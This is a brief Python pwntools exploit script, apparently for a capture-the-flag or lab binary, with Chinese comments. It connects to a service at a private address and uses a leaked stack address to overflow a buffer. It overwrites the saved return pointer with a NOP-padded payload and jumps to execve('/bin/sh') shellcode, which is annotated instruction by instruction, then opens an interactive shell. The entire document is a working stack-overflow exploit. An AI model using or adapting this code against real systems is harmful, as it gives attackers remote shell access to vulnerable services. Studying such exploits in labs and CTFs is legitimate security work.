#!/usr/bin/python
#coding:utf-8
#直接劫持到对应位置
from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)

shellcode = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
#xor rdi, rdi
#push rdi
#push rdi
#pop rsi
#pop rdx
#mov rdi, 68732F6E69622F2Fh
#shr rdi, 8
#push rdi
#push rsp
#pop rdi
#push 3Bh
#pop rax
#syscall

shellcode_address_at_stack = int(io.recv()[:-1], 16)+0x20			#泄露的栈地址+0x20即为我们放置的shellcode地址
log.info("Leak stack address = %x", shellcode_address_at_stack)

payload = "\x90"*24													#任意字符填充到栈中至保存的RIP处，此处选用了空指令NOP，即\x90作为填充字符
payload += p64(shellcode_address_at_stack)							#拼接shellcode所在的栈地址，劫持RIP到该地址以执行shellcode
payload += shellcode												#执行system("/bin/sh")的shellcode
io.sendline(payload)
io.interactive()